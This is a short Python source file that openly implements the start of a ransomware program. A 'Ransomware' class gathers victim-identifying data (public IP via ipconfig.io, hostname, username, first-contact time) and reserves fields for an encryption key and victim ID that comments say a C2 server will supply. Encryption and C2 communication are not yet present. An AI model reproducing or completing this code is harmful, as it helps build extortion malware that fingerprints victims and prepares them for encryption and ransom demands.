# coding: utf-8

import httpx  # Handling HTTP request/responses
import datetime  # Handling time-related data
import os  # For system-related data handling (hostname/usernames)


class Ransomware:
    """This object implements the core function and variables for the Ransomware"""

    def __init__(self):
        # Get Public IP as one of the identification indicators
        self.public_ip = httpx.get("https://ipconfig.io/ip").text.replace("\n", "")

        # Get current date to estimate when contact was established
        self.firstContact = datetime.datetime.now()

        # Get hostname/username as another identification indicator
        self.hostname = os.environ["COMPUTERNAME"]
        self.username = os.environ["USERNAME"]

        # Data which will be received by C2 server later on
        self.encryption_key = None
        self.victim_id = None

    def __str__(self):
        return f"IP: {self.public_ip}, Date: {self.firstContact}, Username: {self.username}, Hostname: {self.hostname}"


def main():
    rnsm = Ransomware()
    print(rnsm)


if __name__ == "__main__":
    main()
